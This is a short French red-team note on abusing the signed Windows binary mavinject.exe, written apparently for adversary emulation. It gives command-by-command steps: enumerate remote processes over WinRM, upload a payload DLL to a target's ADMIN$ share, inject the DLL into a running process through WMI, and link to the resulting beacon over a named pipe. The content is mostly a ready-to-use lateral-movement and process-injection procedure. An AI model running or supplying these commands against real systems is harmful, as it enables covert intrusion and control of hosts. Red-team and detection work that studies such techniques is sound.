

> [!Attention]
> Détournement des programmes natifs windows.
> D'un point de vue OPSEC les LOLBAS sont déjà relativement bien surveillés par les équipes de détection. Mais peut etre utile pour l'adversary emulation


# Mavinject

Executable signé microsoft qui permet d'injecter des DLL dans des processus.

1. Lister les processus distants

```
remote-exec winrm <target> Get-Process -IncludeUserName | select Id, ProcessName, UserName | sort -Property Id
```

2. Upload une DLL sur la target

```
cd \\lon-ws-1\ADMIN$\System32
upload C:\Payloads\smb_x64.dll
```

3. Utiliser mavinject pour injecter la dll dans un processus

```
remote-exec wmi  mavinject.exe <pid> /INJECTRUNNING C:\Windows\System32\smb_x64.dll
```

4. Etablir le lien avec le beacon

```
link <target> TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337
```